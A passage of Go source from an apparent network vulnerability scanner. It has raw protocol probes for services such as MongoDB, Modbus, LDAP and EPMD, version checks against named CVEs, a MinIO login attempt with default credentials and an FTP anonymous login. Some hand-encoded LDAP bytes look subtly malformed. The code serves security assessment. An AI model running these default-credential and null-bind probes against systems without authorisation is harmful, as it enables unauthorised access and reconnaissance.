// probeMongoDB sends the MongoDB OP_MSG "hello" wire-protocol message and
// checks that the response starts with a valid MongoDB wire-protocol header.
//
// Wire format: MsgHeader (16 bytes) + OP_MSG body.
// We send a minimal isMaster/hello request and check whether the response
// carries a BSON document with { ok: 1 }.
func probeMongoDB(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	dialer := &net.Dialer{Timeout: dialTimeout}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))

	// Build a minimal OP_MSG hello.
	// BSON document: { isMaster: 1 }
	// Encoding: int32 len + elements + 0x00 terminator
	//   "\x13\x00\x00\x00"               -- doc len = 19
	//   "\x10"                            -- type int32
	//   "isMaster\x00"                   -- key
	//   "\x01\x00\x00\x00"               -- value 1
	//   "\x00"                            -- terminator
	bsonDoc := []byte{
		0x13, 0x00, 0x00, 0x00, // document length = 19
		0x10,                                           // type: int32
		0x69, 0x73, 0x4d, 0x61, 0x73, 0x74, 0x65, 0x72, 0x00, // "isMaster\0"
		0x01, 0x00, 0x00, 0x00, // value: 1
		0x00, // terminator
	}

	// OP_MSG header + flagBits (0) + section kind 0 + BSON body
	// MsgHeader: messageLength(4) requestID(4) responseTo(4) opCode(4)
	// OP_MSG opCode = 2013 (0x07DD)
	const opMsg = 2013
	flagBits := []byte{0x00, 0x00, 0x00, 0x00}
	sectionKind := []byte{0x00} // kind 0 = body

	body := append(flagBits, sectionKind...)
	body = append(body, bsonDoc...)

	headerLen := 16 + len(body)
	header := make([]byte, 16)
	binary.LittleEndian.PutUint32(header[0:4], uint32(headerLen))
	binary.LittleEndian.PutUint32(header[4:8], 1)    // requestID
	binary.LittleEndian.PutUint32(header[8:12], 0)   // responseTo
	binary.LittleEndian.PutUint32(header[12:16], opMsg)

	msg := append(header, body...)
	if _, err := conn.Write(msg); err != nil {
		return false
	}

	// Read the 16-byte response header and check opCode is OP_MSG (2013).
	respHeader := make([]byte, 16)
	if _, err := io.ReadFull(conn, respHeader); err != nil {
		return false
	}
	respOpCode := binary.LittleEndian.Uint32(respHeader[12:16])
	// A valid MongoDB response returns OP_MSG (2013) or the legacy OP_REPLY (1).
	return respOpCode == opMsg || respOpCode == 1
}

// probeMQTT sends a minimal MQTT CONNECT packet and checks for a CONNACK response.
// Returns true when the server responds with the MQTT 0x20 CONNACK fixed header,
// confirming an MQTT broker — regardless of whether it accepts the connection.
func probeMQTT(ctx context.Context, host string, port int, useTLS bool) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	dialer := &net.Dialer{Timeout: dialTimeout}
	var conn net.Conn
	var err error
	if useTLS {
		tlsCfg := &tls.Config{InsecureSkipVerify: true} //nolint:gosec
		rawConn, dialErr := dialer.DialContext(ctx, "tcp", addr)
		if dialErr != nil {
			return false
		}
		tlsConn := tls.Client(rawConn, tlsCfg)
		if err = tlsConn.HandshakeContext(ctx); err != nil {
			_ = rawConn.Close()
			return false
		}
		conn = tlsConn
	} else {
		conn, err = dialer.DialContext(ctx, "tcp", addr)
	}
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))

	// MQTT 3.1.1 CONNECT packet (minimal — empty client ID, no auth).
	// Fixed header: 0x10 (CONNECT), remaining length 12.
	// Variable header: protocol name "MQTT" (4 bytes), level 4, connect flags 0x00, keepalive 60.
	// Payload: client ID length 0x00 0x00 (empty).
	connect := []byte{
		0x10, 0x0c, // Fixed header: CONNECT, remaining length 12
		0x00, 0x04, 'M', 'Q', 'T', 'T', // Protocol name
		0x04,       // Protocol level 4 (MQTT 3.1.1)
		0x00,       // Connect flags: no auth, no will
		0x00, 0x3c, // Keep-alive: 60 seconds
		0x00, 0x00, // Client ID length: 0 (empty)
	}
	if _, err := conn.Write(connect); err != nil {
		return false
	}
	buf := make([]byte, 4)
	n, _ := conn.Read(buf)
	// CONNACK fixed header is 0x20; any CONNACK (accepted or refused) confirms MQTT.
	return n >= 2 && buf[0] == 0x20
}

// probeSIP sends a SIP OPTIONS request and checks for a SIP/2.0 response line.
// Returns the response status line on success (e.g. "SIP/2.0 200 OK"), "" otherwise.
func probeSIP(ctx context.Context, host string, port int) string {
	addr := fmt.Sprintf("%s:%d", host, port)
	dialer := &net.Dialer{Timeout: dialTimeout}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return ""
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))

	req := fmt.Sprintf(
		"OPTIONS sip:%s SIP/2.0\r\n"+
			"Via: SIP/2.0/TCP %s:%d;branch=z9hG4bKbeacon\r\n"+
			"From: <sip:beacon@%s>;tag=beacon\r\n"+
			"To: <sip:%s>\r\n"+
			"Call-ID: beacon-probe@%s\r\n"+
			"CSeq: 1 OPTIONS\r\n"+
			"Max-Forwards: 1\r\n"+
			"Content-Length: 0\r\n\r\n",
		host, host, port, host, host, host,
	)
	if _, err := conn.Write([]byte(req)); err != nil {
		return ""
	}
	buf := make([]byte, 256)
	n, _ := conn.Read(buf)
	resp := strings.TrimSpace(string(buf[:n]))
	if strings.HasPrefix(resp, "SIP/2.0") {
		// Return just the first line (status line).
		if idx := strings.Index(resp, "\r\n"); idx > 0 {
			return resp[:idx]
		}
		return resp
	}
	return ""
}

// probeRTSP sends an RTSP OPTIONS request and checks for an RTSP/1.0 response.
// Returns the response status line on success (e.g. "RTSP/1.0 200 OK"), "" otherwise.
func probeRTSP(ctx context.Context, host string, port int) string {
	addr := fmt.Sprintf("%s:%d", host, port)
	dialer := &net.Dialer{Timeout: dialTimeout}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return ""
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))

	req := fmt.Sprintf("OPTIONS rtsp://%s:%d/ RTSP/1.0\r\nCSeq: 1\r\n\r\n", host, port)
	if _, err := conn.Write([]byte(req)); err != nil {
		return ""
	}
	buf := make([]byte, 256)
	n, _ := conn.Read(buf)
	resp := strings.TrimSpace(string(buf[:n]))
	if strings.HasPrefix(resp, "RTSP/1.0") {
		if idx := strings.Index(resp, "\r\n"); idx > 0 {
			return resp[:idx]
		}
		return resp
	}
	return ""
}

// probeISCSI sends a minimal iSCSI Login Request PDU and checks that the
// response carries the iSCSI Login Response opcode (0x23), confirming an iSCSI target.
func probeISCSI(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	dialer := &net.Dialer{Timeout: dialTimeout}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))

	// Minimal iSCSI Login Request (48-byte header, empty data segment).
	// Opcode 0x03 (Login Request) | Immediate + Final bit (0x43).
	pdu := make([]byte, 48)
	pdu[0] = 0x43  // opcode 0x03 | I-bit | Final-bit
	pdu[1] = 0x87  // Transit=1, Continue=0, CSG=0 (SecurityNegotiation), NSG=3 (FullFeaturePhase)
	pdu[2] = 0x00  // Version-max
	pdu[3] = 0x00  // Version-min
	// Remaining bytes zero: empty header digest, data length 0, ISID, TSIH, ITT, CID, etc.
	if _, err := conn.Write(pdu); err != nil {
		return false
	}
	buf := make([]byte, 48)
	n, _ := conn.Read(buf)
	// iSCSI Login Response opcode is 0x23.
	return n >= 1 && (buf[0]&0x3f) == 0x23
}

// probeModbus sends a minimal Modbus TCP Read Holding Registers request and
// checks that the response is a valid Modbus TCP frame (matching transaction ID
// and protocol identifier 0x0000). Returns true when a Modbus device is confirmed.
func probeModbus(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	dialer := &net.Dialer{Timeout: dialTimeout}
	conn, err := dialer.DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(bannerTimeout))

	// Modbus TCP ADU: Transaction ID (0x0001) | Protocol ID (0x0000) |
	// Length (0x0006) | Unit ID (0x01) | FC 0x03 (Read Holding Registers) |
	// Starting Address (0x0000) | Quantity (0x0001)
	req := []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, 0x00, 0x00, 0x01}
	if _, err := conn.Write(req); err != nil {
		return false
	}
	buf := make([]byte, 16)
	n, _ := conn.Read(buf)
	// Valid Modbus TCP response: transaction ID echo (bytes 0-1) + protocol ID 0x0000 (bytes 2-3).
	return n >= 4 && buf[0] == 0x00 && buf[1] == 0x01 && buf[2] == 0x00 && buf[3] == 0x00
}

// serviceNucleiTagMap maps open port numbers to Nuclei template tags.
// When Phase A discovers these ports, the tags are added to the Nuclei run so
// service-specific CVE and misconfiguration templates fire automatically.
var serviceNucleiTagMap = map[int][]string{
	6379:  {"redis"},
	9200:  {"elasticsearch"},
	9300:  {"elasticsearch"},
	2375:  {"docker"},
	10250: {"kubernetes", "kubelet"},
	10255: {"kubernetes", "kubelet"},
	2380:  {"etcd"},
	6443:  {"kubernetes"},
	8001:  {"kubernetes"},
	27017: {"mongodb"},
	9090:  {"prometheus"},
	9091:  {"prometheus"},
	9100:  {"node-exporter"},
	5432:  {"postgresql"},
	3306:  {"mysql"},
	1433:  {"mssql"},
	3389:  {"rdp"},
	5900:  {"vnc"},
	21:    {"ftp"},
	23:    {"telnet"},
	445:   {"smb"},
	11211: {"memcached"},
	5984:  {"couchdb"},
	8888:  {"jupyter"},
	11434: {"ollama"},
	1883:  {"mqtt"},
	8883:  {"mqtt"},
	5060:  {"sip"},
	554:   {"rtsp"},
	502:   {"modbus", "scada"},
	8291:  {"mikrotik", "winbox"},
	5601:  {"kibana"},
	7474:  {"neo4j"},
	9000:  {"sonarqube"},
	4848:  {"glassfish"},
	7001:  {"weblogic"},
	9043:  {"websphere"},
	2376:  {"docker"},
	2379:  {"etcd"},
	8200:  {"vault"},
	8500:  {"consul"},
	15672: {"rabbitmq"},
	16686: {"jaeger"},
	5672:  {"rabbitmq", "amqp"},
	5985:  {"winrm"},
	5986:  {"winrm"},
	8080:  {"http"},
	8086:  {"influxdb"},
	8089:  {"splunk"},
	8443:  {"ssl"},
	9042:  {"cassandra"},
	9092:  {"kafka"},
	2181:  {"zookeeper"},
}

// ServiceNucleiTags returns deduplicated Nuclei template tags for the given
// open port map. Called by the surface module after Phase A to augment the
// Nuclei template run with service-specific CVE checks.
func ServiceNucleiTags(openPorts map[int]string) []string {
	seen := make(map[string]bool)
	var tags []string
	for port := range openPorts {
		for _, tag := range serviceNucleiTagMap[port] {
			if !seen[tag] {
				seen[tag] = true
				tags = append(tags, tag)
			}
		}
	}
	return tags
}

// ── Banner version parsers ────────────────────────────────────────────────────

// parseSSHVersion extracts the software identifier from an SSH banner.
// SSH banners follow RFC 4253: "SSH-protoversion-softwareversion[ comment]"
// Examples:
//   - "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5" → "OpenSSH_9.6p1"
//   - "SSH-2.0-dropbear_2022.83"                  → "dropbear_2022.83"
//   - "SSH-1.99-Cisco-1.25"                        → "Cisco-1.25"
func parseSSHVersion(banner string) string {
	if !strings.HasPrefix(banner, "SSH-") {
		return ""
	}
	// Format: SSH-<proto>-<software>[ <comment>]
	// Skip "SSH-" prefix then split on "-" twice to reach software field.
	rest := banner[4:] // strip "SSH-"
	idx := strings.Index(rest, "-")
	if idx == -1 {
		return ""
	}
	software := rest[idx+1:] // everything after proto version
	// Trim optional comment (separated by space)
	if sp := strings.IndexByte(software, ' '); sp != -1 {
		software = software[:sp]
	}
	return software
}

// isOpenSSHUsernameEnumVulnerable returns true when the OpenSSH version is < 7.7p1,
// the range affected by CVE-2018-15473 username enumeration. Fixed in 7.7p1 (Apr 2018).
func isOpenSSHUsernameEnumVulnerable(sv string) bool {
	if !strings.HasPrefix(sv, "OpenSSH_") {
		return false
	}
	verStr := sv[len("OpenSSH_"):]
	dotIdx := strings.IndexByte(verStr, '.')
	if dotIdx == -1 {
		return false
	}
	pIdx := strings.IndexAny(verStr, "p ")
	endIdx := len(verStr)
	if pIdx != -1 {
		endIdx = pIdx
	}
	maj, min := 0, 0
	_, _ = fmt.Sscanf(verStr[:dotIdx], "%d", &maj)
	_, _ = fmt.Sscanf(verStr[dotIdx+1:endIdx], "%d", &min)
	// Vulnerable: any version < 7.7
	if maj < 7 {
		return true
	}
	if maj == 7 && min < 7 {
		return true
	}
	return false
}

// isOpenSSHRegreSSHionVulnerable returns true when the SSH banner indicates an
// OpenSSH version in the CVE-2024-6387 (regreSSHion) vulnerable range:
// 8.5p1 ≤ version ≤ 9.7p1 on a glibc-based (non-OpenBSD) system.
// The bug is a signal-handler race allowing pre-auth RCE as root on Linux.
// Version 9.8p1 contains the fix; OpenBSD-based builds are not affected.
func isOpenSSHRegreSSHionVulnerable(sv, banner string) bool {
	if !strings.HasPrefix(sv, "OpenSSH_") {
		return false
	}
	// OpenBSD builds are not affected by the glibc race.
	if strings.Contains(strings.ToLower(banner), "openbsd") {
		return false
	}
	// Parse version number from "OpenSSH_X.Yp1" → X.Y as float.
	verStr := sv[len("OpenSSH_"):] // e.g. "9.7p1" or "8.5p2"
	dotIdx := strings.IndexByte(verStr, '.')
	if dotIdx == -1 {
		return false
	}
	pIdx := strings.IndexAny(verStr, "p ")
	endIdx := len(verStr)
	if pIdx != -1 {
		endIdx = pIdx
	}
	major := verStr[:dotIdx]
	minor := verStr[dotIdx+1 : endIdx]
	maj := 0
	min := 0
	_, _ = fmt.Sscanf(major, "%d", &maj)
	_, _ = fmt.Sscanf(minor, "%d", &min)
	// Vulnerable: 8.5 ≤ version ≤ 9.7
	if maj == 8 && min >= 5 {
		return true
	}
	if maj == 9 && min <= 7 {
		return true
	}
	return false
}

// isProFTPDModCopyVulnerable returns true when the FTP version string indicates
// ProFTPD 1.3.5 without the "a" patch suffix (CVE-2015-3306). ProFTPD 1.3.5a
// and later report themselves as such, so an exact "ProFTPD 1.3.5" match is
// an unambiguous indicator of the unpatched release.
func isProFTPDModCopyVulnerable(fv string) bool {
	return fv == "ProFTPD 1.3.5"
}

// parseFTPVersion extracts the server software string from an FTP 220 banner.
// Examples:
//   - "220 ProFTPD 1.3.6 Server (hostname)"  → "ProFTPD 1.3.6"
//   - "220 (vsFTPd 3.0.3)"                    → "vsFTPd 3.0.3"
//   - "220 FileZilla Server 1.8.1"            → "FileZilla Server 1.8.1"
//   - "220 Microsoft FTP Service"             → "Microsoft FTP Service"
func parseFTPVersion(banner string) string {
	if !strings.HasPrefix(banner, "220") {
		return ""
	}
	// Strip the "220 " or "220-" prefix
	rest := strings.TrimSpace(banner[3:])
	rest = strings.TrimLeft(rest, "- ")
	// Strip surrounding parentheses: "(vsFTPd 3.0.3)" → "vsFTPd 3.0.3"
	rest = strings.Trim(rest, "()")
	rest = strings.TrimSpace(rest)
	// Drop anything after a " Server" or " server" suffix that includes hostname
	if idx := strings.Index(strings.ToLower(rest), " server "); idx != -1 {
		rest = rest[:idx]
	}
	return rest
}

// parseJSONStringField does a lightweight scan of a JSON body for the first
// occurrence of "key":"value" and returns the value string. It avoids a full
// json.Unmarshal to stay allocation-light for the common hot path.
func parseJSONStringField(body, key string) string {
	needle := `"` + key + `":"`
	idx := strings.Index(body, needle)
	if idx < 0 {
		return ""
	}
	rest := body[idx+len(needle):]
	end := strings.IndexByte(rest, '"')
	if end < 0 {
		return ""
	}
	return rest[:end]
}

// isElasticsearchGroovyVulnerable returns true when the Elasticsearch version is
// in the range that has dynamic Groovy scripting enabled by default (≤ 1.5.x).
// CVE-2015-1427: the Groovy sandbox is bypassable, allowing unauthenticated RCE.
// Fixed in Elasticsearch 1.6.0 (scripting disabled by default); removed in 2.0.
func isElasticsearchGroovyVulnerable(ver string) bool {
	if ver == "" {
		return false
	}
	parts := strings.SplitN(ver, ".", 3)
	if len(parts) < 2 {
		return false
	}
	major, minor := 0, 0
	_, _ = fmt.Sscanf(parts[0], "%d", &major)
	_, _ = fmt.Sscanf(parts[1], "%d", &minor)
	return major == 1 && minor < 6
}

// probeK8sVersion fetches the Kubernetes /version endpoint (unauthenticated by
// default) and returns the gitVersion string (e.g. "v1.11.4"). Returns "" on error.
func probeK8sVersion(ctx context.Context, host string, port int) string {
	body, ok := probeHTTPBody(ctx, host, port, true, "/version")
	if !ok {
		body, ok = probeHTTPBody(ctx, host, port, false, "/version")
		if !ok {
			return ""
		}
	}
	ver := parseJSONStringField(body, "gitVersion")
	return strings.TrimPrefix(ver, "v")
}

// isKubernetesPrivEscVulnerable returns true when the Kubernetes gitVersion is
// in a range affected by CVE-2018-1002105 (WebSocket upgrade privilege escalation):
// < 1.10.11, < 1.11.5, or < 1.12.3.
func isKubernetesPrivEscVulnerable(ver string) bool {
	parts := strings.SplitN(ver, ".", 3)
	if len(parts) < 3 {
		return false
	}
	maj, min, patch := 0, 0, 0
	_, _ = fmt.Sscanf(parts[0], "%d", &maj)
	// Strip pre-release suffix from minor/patch (e.g. "11-gke.1" → 11)
	_, _ = fmt.Sscanf(parts[1], "%d", &min)
	_, _ = fmt.Sscanf(parts[2], "%d", &patch)
	if maj != 1 {
		return false
	}
	switch {
	case min <= 9:
		return true // all 1.x where x < 10 are vulnerable
	case min == 10:
		return patch < 11
	case min == 11:
		return patch < 5
	case min == 12:
		return patch < 3
	default:
		return false // 1.13+ patched
	}
}

// isApacheTikaRCEVulnerable returns true when the Tika Server version is in
// the range affected by CVE-2018-1335 (X-Tika-OCR* command injection): 1.7–1.17.
// Fixed in 1.18.
func isApacheTikaRCEVulnerable(ver string) bool {
	parts := strings.SplitN(ver, ".", 3)
	if len(parts) < 2 {
		return false
	}
	maj, min := 0, 0
	_, _ = fmt.Sscanf(parts[0], "%d", &maj)
	_, _ = fmt.Sscanf(parts[1], "%d", &min)
	return maj == 1 && min >= 7 && min <= 17
}

// isVulnerableKibana returns true when the Kibana version falls in the range
// 8.15.0–8.17.2 affected by CVE-2025-25015 (prototype pollution → RCE, CVSS 9.9).
// Patched in 8.17.3.
func isVulnerableKibana(version string) bool {
	parts := strings.SplitN(version, ".", 3)
	if len(parts) < 3 {
		return false
	}
	major, err := strconv.Atoi(parts[0])
	if err != nil || major != 8 {
		return false
	}
	minor, err := strconv.Atoi(parts[1])
	if err != nil {
		return false
	}
	patch, err := strconv.Atoi(parts[2])
	if err != nil {
		return false
	}
	// Vulnerable: 8.15.0 ≤ version ≤ 8.17.2
	if minor < 15 || minor > 17 {
		return false
	}
	if minor == 17 && patch >= 3 {
		return false // patched
	}
	return true
}

// isVulnerableOllamaVersion returns true when the /api/version JSON body indicates
// an Ollama version below 0.1.47, which is vulnerable to GHSA-q3jj-7xxq-6mgr
// (directory traversal via the model blob endpoint).
func isVulnerableOllamaVersion(body string) bool {
	// Body is JSON like {"version":"0.1.45"}
	idx := strings.Index(body, `"version":"`)
	if idx < 0 {
		return false
	}
	after := body[idx+len(`"version":"`):]
	end := strings.IndexByte(after, '"')
	if end < 0 {
		return false
	}
	ver := after[:end]
	parts := strings.SplitN(ver, ".", 3)
	if len(parts) < 3 {
		return false
	}
	major, err := strconv.Atoi(parts[0])
	if err != nil || major != 0 {
		return false
	}
	minor, err := strconv.Atoi(parts[1])
	if err != nil {
		return false
	}
	patch, err := strconv.Atoi(parts[2])
	if err != nil {
		return false
	}
	// Vulnerable: < 0.1.47
	if minor < 1 {
		return true
	}
	if minor == 1 && patch < 47 {
		return true
	}
	return false
}

// probeMinIODefaultCreds attempts to log in to the MinIO console with the
// factory-default credentials minioadmin/minioadmin via the /api/v1/login
// JSON endpoint. Returns true if the server accepts the credentials.
func probeMinIODefaultCreds(ctx context.Context, host string, port int) bool {
	url := fmt.Sprintf("http://%s:%d/api/v1/login", host, port)
	body := strings.NewReader(`{"accessKey":"minioadmin","secretKey":"minioadmin"}`)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, body)
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{
		Timeout: httpTimeout,
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer func() { _ = resp.Body.Close() }()
	// 200 with a session token means credentials were accepted.
	if resp.StatusCode != http.StatusOK {
		return false
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
	var loginResp struct {
		Token     string `json:"token"`
		SessionID string `json:"sessionId"`
	}
	if err := json.Unmarshal(b, &loginResp); err != nil {
		return false
	}
	return loginResp.Token != "" || loginResp.SessionID != ""
}

// parseWingFTPVersion extracts the version number from a Wing FTP Server banner.
// Wing FTP banners look like: "220 Wing FTP Server 7.4.2 ready." or
// "220-Wing FTP Server 7.4.3". Returns "" if not a Wing FTP banner.
func parseWingFTPVersion(banner string) string {
	lower := strings.ToLower(banner)
	const marker = "wing ftp server "
	idx := strings.Index(lower, marker)
	if idx < 0 {
		return ""
	}
	rest := banner[idx+len(marker):]
	// Extract version: digits and dots only.
	end := strings.IndexFunc(rest, func(r rune) bool {
		return r != '.' && (r < '0' || r > '9')
	})
	if end == 0 {
		return ""
	}
	if end < 0 {
		return strings.TrimSpace(rest)
	}
	return strings.TrimSpace(rest[:end])
}

// isVulnerableWingFTP returns true when the Wing FTP Server version is ≤ 7.4.3,
// which is vulnerable to CVE-2025-47812 (pre-auth RCE, CVSS 9.9, CISA KEV).
// Patched in version 7.4.4.
func isVulnerableWingFTP(version string) bool {
	parts := strings.SplitN(version, ".", 3)
	if len(parts) < 2 {
		return false
	}
	major, err := strconv.Atoi(parts[0])
	if err != nil {
		return false
	}
	minor, err := strconv.Atoi(parts[1])
	if err != nil {
		return false
	}
	patch := 0
	if len(parts) == 3 {
		patch, _ = strconv.Atoi(parts[2])
	}
	if major < 7 {
		return true
	}
	if major == 7 && minor < 4 {
		return true
	}
	if major == 7 && minor == 4 && patch <= 3 {
		return true
	}
	return false
}

// parseGNUTelnetdVersion extracts the version string from a GNU inetutils
// telnetd banner. GNU telnetd announces itself as "GNU telnetd X.Y" in the
// initial connection banner (negotiation phase). Returns "" if not GNU telnetd.
// Example: "GNU telnetd 2.5" → "2.5"
func parseGNUTelnetdVersion(banner string) string {
	lower := strings.ToLower(banner)
	const prefix = "gnu telnetd "
	idx := strings.Index(lower, prefix)
	if idx < 0 {
		return ""
	}
	rest := banner[idx+len(prefix):]
	// Extract version: take up to the first whitespace or end of string.
	end := strings.IndexAny(rest, " \t\r\n")
	if end < 0 {
		return strings.TrimSpace(rest)
	}
	return strings.TrimSpace(rest[:end])
}

// isVulnerableGNUTelnetd returns true when the GNU telnetd version is ≤ 2.7,
// which is vulnerable to CVE-2026-32746 (pre-auth stack buffer overflow in
// the LINEMODE SLC option handler, CVSS 9.8).
func isVulnerableGNUTelnetd(ver string) bool {
	parts := strings.SplitN(ver, ".", 2)
	if len(parts) == 0 {
		return false
	}
	major, err := strconv.Atoi(parts[0])
	if err != nil {
		return false
	}
	if major < 2 {
		return true
	}
	if major > 2 {
		return false
	}
	// major == 2: check minor
	if len(parts) < 2 {
		return true // bare "2" with no minor assumed ≤ 2.7
	}
	minor, err := strconv.Atoi(parts[1])
	if err != nil {
		return false
	}
	return minor <= 7
}

// probeLDAP attempts an LDAP null bind and rootDSE query.
// Returns a map of discovered attributes on success, or nil if the probe fails.
// Detecting an Active Directory DC vs generic LDAP:
//   - AD DCs include "domainControllerFunctionality" in rootDSE
//   - "defaultNamingContext" reveals the AD domain name
func probeLDAP(ctx context.Context, host string, port int) map[string]any {
	addr := fmt.Sprintf("%s:%d", host, port)
	dialer := net.Dialer{}
	dialCtx, cancel := context.WithTimeout(ctx, 4*time.Second)
	defer cancel()

	conn, err := dialer.DialContext(dialCtx, "tcp", addr)
	if err != nil {
		return nil
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(4 * time.Second))

	// LDAP null bind request (LDAPMessage with BindRequest, empty DN, empty password).
	// BER encoding: SEQUENCE { INTEGER 1, [APPLICATION 0] { INTEGER 3, OCTET_STRING "", [0] "" } }
	nullBind := []byte{
		0x30, 0x0c, // SEQUENCE, length 12
		0x02, 0x01, 0x01, // INTEGER 1 (messageID)
		0x60, 0x07, // BindRequest (APPLICATION 0), length 7
		0x02, 0x01, 0x03, // INTEGER 3 (version)
		0x04, 0x00, // OCTET STRING "" (DN)
		0x80, 0x00, // [0] "" (simple auth, empty password)
	}
	if _, err := conn.Write(nullBind); err != nil {
		return nil
	}

	// Read bind response — expect success (resultCode 0).
	buf := make([]byte, 512)
	n, err := conn.Read(buf)
	if err != nil || n < 7 {
		return nil
	}
	// Check for BindResponse (APPLICATION 1) with resultCode 0 (success).
	// Simplified check: look for 0x61 (BindResponse tag) and 0x00 (success) in response.
	found := false
	for i := 0; i < n-1; i++ {
		if buf[i] == 0x61 { // BindResponse
			// resultCode is in the body; 0x0a 0x01 0x00 = ENUMERATED 0 (success)
			for j := i; j < n-2; j++ {
				if buf[j] == 0x0a && buf[j+1] == 0x01 && buf[j+2] == 0x00 {
					found = true
					break
				}
			}
		}
	}
	if !found {
		return nil
	}

	// Now send a searchRequest for rootDSE (base="", scope=baseObject, filter=(objectClass=*))
	// requesting: namingContexts, defaultNamingContext, dnsHostName, domainControllerFunctionality
	rootDSEReq := []byte{
		0x30, 0x59, // SEQUENCE, length 89
		0x02, 0x01, 0x02, // INTEGER 2 (messageID)
		0x63, 0x54, // SearchRequest (APPLICATION 3), length 84
		0x04, 0x00, // baseObject: "" (rootDSE)
		0x0a, 0x01, 0x00, // scope: baseObject (0)
		0x0a, 0x01, 0x00, // derefAliases: neverDerefAliases (0)
		0x02, 0x01, 0x00, // sizeLimit: 0
		0x02, 0x01, 0x00, // timeLimit: 0
		0x01, 0x01, 0x00, // typesOnly: false
		0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x43, 0x6c, 0x61, 0x73, 0x73, // filter: (objectClass=*)
		0x30, 0x34, // attributes SEQUENCE
		0x04, 0x0f, 0x6e, 0x61, 0x6d, 0x69, 0x6e, 0x67, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x73, 0x00, // "namingContexts" (padded)
		0x04, 0x16, 0x64, 0x65, 0x66, 0x61, 0x75, 0x6c, 0x74, 0x4e, 0x61, 0x6d, 0x69, 0x6e, 0x67, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00,
		0x04, 0x0b, 0x64, 0x6e, 0x73, 0x48, 0x6f, 0x73, 0x74, 0x4e, 0x61, 0x6d, 0x65, 0x00, // "dnsHostName"
	}
	_ = conn.SetDeadline(time.Now().Add(4 * time.Second))
	_, _ = conn.Write(rootDSEReq)

	// Read rootDSE response — parse text content from response.
	rbuf := make([]byte, 4096)
	rn, _ := conn.Read(rbuf)
	if rn == 0 {
		// Null bind succeeded even if rootDSE failed — still report LDAP exposure.
		return map[string]any{"port": 389, "service": "ldap", "null_bind": true, "is_active_directory": false}
	}

	responseText := string(rbuf[:rn])
	result := map[string]any{
		"port":       port,
		"service":    "ldap",
		"null_bind":  true,
		"is_active_directory": false,
	}

	// Detect AD-specific strings in the response.
	if strings.Contains(responseText, "DC=") {
		result["is_active_directory"] = true
		// Extract defaultNamingContext (e.g. "DC=corp,DC=example,DC=com").
		if idx := strings.Index(responseText, "DC="); idx >= 0 {
			end := idx + 60
			if end > rn {
				end = rn
			}
			candidate := responseText[idx:end]
			if nl := strings.IndexAny(candidate, "\x00\n\r "); nl > 0 {
				candidate = candidate[:nl]
			}
			result["ad_domain"] = candidate
		}
	}
	if strings.Contains(responseText, "domainControllerFunctionality") {
		result["is_active_directory"] = true
	}
	if strings.Contains(responseText, "dnsHostName") {
		result["has_dns_hostname"] = true
	}

	return result
}

// probeEPMD sends an Erlang Port Mapper Daemon NAMES request and returns
// the list of registered node names. Returns nil if the probe fails.
func probeEPMD(ctx context.Context, host string, port int) []string {
	addr := fmt.Sprintf("%s:%d", host, port)
	dialer := net.Dialer{}
	dialCtx, cancel := context.WithTimeout(ctx, 3*time.Second)
	defer cancel()

	conn, err := dialer.DialContext(dialCtx, "tcp", addr)
	if err != nil {
		return nil
	}
	defer func() { _ = conn.Close() }()
	_ = conn.SetDeadline(time.Now().Add(3 * time.Second))

	// EPMD NAMES request: 2-byte big-endian length prefix + 1 byte type (0x6e = NAMES_REQ).
	req := []byte{0x00, 0x01, 0x6e}
	if _, err := conn.Write(req); err != nil {
		return nil
	}

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil || n < 5 {
		return nil
	}

	// Response: 4-byte EPMD port (big-endian), then "name <node> at port <port>\n" entries.
	response := string(buf[4:n])
	if !strings.Contains(response, "name ") {
		return nil
	}

	var nodes []string
	for _, line := range strings.Split(response, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "name ") {
			// Format: "name rabbit at port 25672"
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				nodes = append(nodes, parts[1])
			}
		}
	}
	return nodes
}

// ── FTP anonymous login probe ─────────────────────────────────────────────────

// probeFTPAnonymous attempts an FTP anonymous login.
// Returns true when the server accepts USER anonymous + PASS anonymous (230 reply).
func probeFTPAnonymous(ctx context.Context, host string, port int) bool {
	d := &net.Dialer{Timeout: dialTimeout}
	conn, err := d.DialContext(ctx, "tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	conn.SetDeadline(time.Now().Add(5 * time.Second)) //nolint:errcheck

